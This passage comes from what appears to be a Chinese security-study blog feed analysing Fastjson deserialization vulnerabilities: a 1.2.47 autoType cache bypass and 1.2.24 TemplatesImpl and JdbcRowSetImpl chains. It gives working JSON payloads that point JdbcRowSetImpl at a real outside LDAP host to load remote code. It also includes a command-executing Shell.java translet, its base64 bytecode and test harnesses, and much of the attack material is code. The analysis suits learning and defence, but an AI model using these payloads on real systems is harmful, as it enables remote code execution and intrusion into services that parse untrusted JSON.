alt="image-20240326213655825"></p><p>可以发现loadClass开启了缓存，并在1153行将val的值写入了缓存</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240326213853548.png" alt="image-20240326213853548"></p><p>当再次进入checkAutoType的时候，此时的tyoeName就是com.sun.rowset.JdbcRowSetImpl</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240326214238747.png" alt="image-20240326214238747"></p><p>在经过了对于L&amp;;、[的检测之后，进入了黑名单判断，但细看抛出异常的条件（下面代码），是类在黑名单里且不在缓存中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (Arrays.binarySearch(<span class="built_in">this</span>.denyHashCodes, hash) &gt;= <span class="number">0</span> &amp;&amp; TypeUtils.getClassFromMapping(typeName) == <span class="literal">null</span>) &#123;&#125;</span><br></pre></td></tr></table></figure><p>通过这种方式就可以让我们的恶意类绕过检测，成功返回clazz(839行)，后面就和上面的步骤一样了</p><p>payload</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.Class&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;val&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://110.41.17.183:5555/Exploit&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>测试代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo1247</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;&#123;\&quot;@type\&quot;: \&quot;java.lang.Class\&quot;, \&quot;val\&quot;: \&quot;com.sun.rowset.JdbcRowSetImpl\&quot;&#125;, &#123;\&quot;@type\&quot;: \&quot;com.sun.rowset.JdbcRowSetImpl\&quot;, \&quot;dataSourceName\&quot;: \&quot;ldap://110.41.17.183:5555/Exploit\&quot;, \&quot;autoCommit\&quot;: true&#125;&#125;&quot;</span>;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        System.out.println(payload);</span><br><span class="line">        JSON.parseObject(payload);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="不开启AutoType分析">不开启AutoType分析</h3><p>和上面的步骤基本相同</p><p>不同的是第二次，由于我们并没有开启AutoType，所以不会进入下面的if语句</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240326215352786.png" alt="image-20240326215352786"></p><p>clazz为null，直接进入到下面的第一个框的语句里</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240326215417529.png" alt="image-20240326215417529"></p><p>因为上一次已经将com.sun.rowset.JdbcRowSetImpl加入了我们的缓存，所以getClassFromMapping就找到了该类并将其赋值给clazz，因此，恶意类绕过了在下面的!this.autoTypeSupport的if检测，直接在第二个个框的语句里进行了返回，再在后面的parseObject中进行了loadClass加载，实现了不开启AutoType的绕过</p><p>payload</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.Class&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;val&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://110.41.17.183:5555/Exploit&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>测试代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo1247</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;&#123;\&quot;@type\&quot;: \&quot;java.lang.Class\&quot;, \&quot;val\&quot;: \&quot;com.sun.rowset.JdbcRowSetImpl\&quot;&#125;, &#123;\&quot;@type\&quot;: \&quot;com.sun.rowset.JdbcRowSetImpl\&quot;, \&quot;dataSourceName\&quot;: \&quot;ldap://110.41.17.183:5555/Exploit\&quot;, \&quot;autoCommit\&quot;: true&#125;&#125;&quot;</span>;</span><br><span class="line">        <span class="comment">//ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</span></span><br><span class="line">        System.out.println(payload);</span><br><span class="line">        JSON.parseObject(payload);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>FastJson1.2.24</title>
      <link href="/posts/1837oiuj.html"/>
      <url>/posts/1837oiuj.html</url>
      
        <content type="html"><![CDATA[<h1>FastJson1.2.24</h1><p>先提一下fastjson的功能要点</p><ul><li><p>使用 <code>JSON.parse(jsonString)</code> 和 <code>JSON.parseObject(jsonString, Target.class)</code>，两者调用链一致，前者会在 jsonString 中解析字符串获取 <code>@type</code> 指定的类，后者则会直接使用参数中的class。</p></li><li><p>fastjson 在创建一个类实例时会通过反射调用类中符合条件的 getter/setter 方法，其中 getter 方法需满足条件：方法名长于 4、不是静态方法、以 <code>get</code> 开头且第4位是大写字母、方法不能有参数传入、继承自 <code>Collection|Map|AtomicBoolean|AtomicInteger|AtomicLong</code>、此属性没有 setter 方法；setter 方法需满足条件：方法名长于 4，以 <code>set</code> 开头且第4位是大写字母、非静态方法、返回类型为 void 或当前类、参数个数为 1 个。具体逻辑在 <code>com.alibaba.fastjson.util.JavaBeanInfo.build()</code> 中。</p></li><li><p>使用 <code>JSON.parseObject(jsonString)</code> 将会返回 JSONObject 对象，且类中的所有 getter 与setter 都被调用。</p></li><li><p>如果目标类中私有变量没有 setter 方法，但是在反序列化时仍想给这个变量赋值，则需要使用 <code>Feature.SupportNonPublicField</code> 参数。</p></li><li><p>fastjson 在为类属性寻找 get/set 方法时，调用函数 <code>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#smartMatch()</code> 方法，会忽略 <code>_|-</code> 字符串，也就是说哪怕你的字段名叫 <code>_a_g_e_</code>，getter 方法为 <code>getAge()</code>，fastjson 也可以找得到，在 1.2.36 版本及后续版本还可以支持同时使用 <code>_</code> 和 <code>-</code> 进行组合混淆。</p></li><li><p>fastjson 在反序列化时，如果 Field 类型为 <code>byte[]</code>，将会调用<code>com.alibaba.fastjson.parser.JSONScanner#bytesValue</code> 进行 base64 解码，对应的，在序列化时也会进行 base64 编码。</p></li></ul><h2 id="TemplatesImpl-反序列化">TemplatesImpl 反序列化</h2><p>Fastjson（1.2.2 - 1.2.4）在启用了<code>SupportNonPublicField</code>特性时可以利用Xalan的TemplatesImpl实现RCE</p><p>Fastjson会创建<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>类实例，并通过json中的字段去映射<code>TemplatesImpl</code>类中的成员变量，比如将<code>_bytecodes</code> 经过Base64解码后将byte[]映射到<code>TemplatesImpl</code>类的<code>_bytecodes</code>上，其他字段同理。但仅仅是属性映射是无法触发传入的类实例化的，还必须要调用<code>getOutputProperties()</code>方法才会触发<code>defineClass</code>（使用传入的恶意类字节码创建类）和<code>newInstance</code>（创建恶意类实例，从而触发恶意类构造方法中的命令执行代码）</p><p>首先可以在Templateslmpl#getTransletInstance中得到实例化函数</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240318223615243.png" alt="image-20240318223615243"></p><p>可以发现这是将_class这个数组中的[_transletIndex]进行了实例化，所以这就可以确定了我们链子的最终利用点</p><p>通过查看实例我们可以发现如下关系，类中的 <code>getOutputProperties()</code> 方法调用 <code>newTransformer()</code> 方法，而 <code>newTransformer()</code> 又调用了 <code>getTransletInstance()</code> 方法。图如下</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240318224736921.png" alt="image-20240318224736921"></p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240318224746475.png" alt="image-20240318224746475"></p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240318224924186.png" alt="image-20240318224924186"></p><p>那么这个时候就要看getOutputProperties()是否可控了，这个方法是OutputProperties的getter方法，然后就是看上面所提到的class数组是否可控，这决定了我们是否可以实例化我们所要加载的恶意类</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240318225328005.png" alt="image-20240318225328005"></p><p>可以发现在上图的参数具有赋值操作，其中defineTransletClasses在getTransletInstance是有调用的，只要_class为空就可以调用，详见下图</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240318225536452.png" alt="image-20240318225536452"></p><p>分析defineTransletClasses可以得到，如果_bytecodes不为空，那么就会进行自定义类的调用</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240319102645958.png" alt="image-20240319102645958"></p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240318231646986.png" alt="image-20240318231646986"></p><p>接下来就是构造恶意类，形成payload了</p><p>Shell.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.imageio.IIOException;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Shell</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Base64Encoder.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Base64Encoder</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 替换为你的字节码文件路径</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">filePath</span> <span class="operator">=</span> <span class="string">&quot;./out/production/1.2.24/Shell.class&quot;</span>;</span><br><span class="line">        <span class="type">byte</span>[] classBytes = Files.readAllBytes(Paths.get(filePath));</span><br><span class="line">        <span class="type">String</span> <span class="variable">encoded</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(classBytes);</span><br><span class="line">        System.out.println(encoded);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>本地测试代码FastjsonTest1.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FastjsonTest1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">byteCode</span> <span class="operator">=</span> <span class="string">&quot;yv66vgAAADQANgoACAAmCAAnCgAoACkKACgAKgcAKwoABQAsBwAtBwAuAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAdMU2hlbGw7AQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHAC8BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACDxjbGluaXQ+AQADY21kAQASTGphdmEvbGFuZy9TdHJpbmc7AQABZQEAFUxqYXZhL2lvL0lPRXhjZXB0aW9uOwEADVN0YWNrTWFwVGFibGUHACsBAApTb3VyY2VGaWxlAQAKU2hlbGwuamF2YQwACQAKAQAEY2FsYwcAMAwAMQAyDAAzADQBABNqYXZhL2lvL0lPRXhjZXB0aW9uDAA1AAoBAAVTaGVsbAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAPcHJpbnRTdGFja1RyYWNlACEABwAIAAAAAAAEAAEACQAKAAEACwAAAC8AAQABAAAABSq3AAGxAAAAAgAMAAAABgABAAAACgANAAAADAABAAAABQAOAA8AAAABABAAEQACAAsAAAA/AAAAAwAAAAGxAAAAAgAMAAAABgABAAAAGAANAAAAIAADAAAAAQAOAA8AAAAAAAEAEgATAAEAAAABABQAFQACABYAAAAEAAEAFwABABAAGAACAAsAAABJAAAABAAAAAGxAAAAAgAMAAAABgABAAAAHQANAAAAKgAEAAAAAQAOAA8AAAAAAAEAEgATAAEAAAABABkAGgACAAAAAQAbABwAAwAWAAAABAABABcACAAdAAoAAQALAAAAcQACAAEAAAAUEgJLuAADKrYABFenAAhLKrYABrEAAQAAAAsADgAFAAMADAAAABoABgAAAA4AAwAPAAsAEgAOABAADwARABMAEwANAAAAFgACAAMACAAeAB8AAAAPAAQAIAAhAAAAIgAAAAcAAk4HACMEAAEAJAAAAAIAJQ==&quot;</span>;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">NASTY_CLASS</span> <span class="operator">=</span> <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;&quot;</span> + NASTY_CLASS +</span><br><span class="line">                <span class="string">&quot;\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;</span>+byteCode+<span class="string">&quot;\&quot;],&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#x27;_name&#x27;:&#x27;Chu0&#x27;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#x27;_tfactory&#x27;:&#123;&#125;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;_outputProperties\&quot;:&#123;&#125;&#125;\n&quot;</span>;</span><br><span class="line">        System.out.println(payload);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> JSON.parseObject(payload, Feature.SupportNonPublicField);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里给出payload</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;_bytecodes&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;yv66vgAAADQANgoACAAmCAAnCgAoACkKACgAKgcAKwoABQAsBwAtBwAuAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAdMU2hlbGw7AQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHAC8BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACDxjbGluaXQ+AQADY21kAQASTGphdmEvbGFuZy9TdHJpbmc7AQABZQEAFUxqYXZhL2lvL0lPRXhjZXB0aW9uOwEADVN0YWNrTWFwVGFibGUHACsBAApTb3VyY2VGaWxlAQAKU2hlbGwuamF2YQwACQAKAQAEY2FsYwcAMAwAMQAyDAAzADQBABNqYXZhL2lvL0lPRXhjZXB0aW9uDAA1AAoBAAVTaGVsbAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAPcHJpbnRTdGFja1RyYWNlACEABwAIAAAAAAAEAAEACQAKAAEACwAAAC8AAQABAAAABSq3AAGxAAAAAgAMAAAABgABAAAACgANAAAADAABAAAABQAOAA8AAAABABAAEQACAAsAAAA/AAAAAwAAAAGxAAAAAgAMAAAABgABAAAAGAANAAAAIAADAAAAAQAOAA8AAAAAAAEAEgATAAEAAAABABQAFQACABYAAAAEAAEAFwABABAAGAACAAsAAABJAAAABAAAAAGxAAAAAgAMAAAABgABAAAAHQANAAAAKgAEAAAAAQAOAA8AAAAAAAEAEgATAAEAAAABABkAGgACAAAAAQAbABwAAwAWAAAABAABABcACAAdAAoAAQALAAAAcQACAAEAAAAUEgJLuAADKrYABFenAAhLKrYABrEAAQAAAAsADgAFAAMADAAAABoABgAAAA4AAwAPAAsAEgAOABAADwARABMAEwANAAAAFgACAAMACAAeAB8AAAAPAAQAIAAhAAAAIgAAAAcAAk4HACMEAAEAJAAAAAIAJQ==&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;_name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Chu0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;_tfactory&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;_outputProperties&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;_auxClasses&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span> <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;_transletIndex&quot;</span><span class="punctuation">:</span><span class="number">0</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>这里的_name和_tfactory是为了防止为null进而报错，链子分析</p><p>fj会在创建一个类实例时会通过反射调用类中符合条件的参数的getter或者setter方法，这里是getter方法也就是getOutputProperties()，这是入口，接下来就是调用该方法中的newTransformer()，再到newTransformer()方法中的getTransletInstance()，由于我们的_class为空，所以根据逻辑又会触发defineTransletClasses，由于_bytecodes不为null，所以就会将_bytecodes[0]中的字节码加载进_class[0]中，最后，在_class[_transletIndex].getConstructor().newInstance();将恶意类进行实例化，执行我们的恶意命令</p><h2 id="JdbcRowSetImpl-反序列化">JdbcRowSetImpl 反序列化</h2><p>很好理解com.sun.rowset.JdbcRowSetImpl有两个函数，一个是setAutoCommit()，一个是connect()，漏洞的主要成因是connect中的lookup函数的参数可控，下面是setAutoCommit</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240319105150237.png" alt="image-20240319105150237"></p><p>在这里调用了connect方法，继续跟踪</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240319105245765.png" alt="image-20240319105245765"></p><p>在这里我们就看到了lookup函数，他的参数是getDataSourceName，根据fj的运行原理，我们可以明白在创建实例的时候fj会调用对应参数的getter或者setter方法，payload如下</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://110.41.17.183:5555/ExploitTest&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span></span><br><span class="line"><span 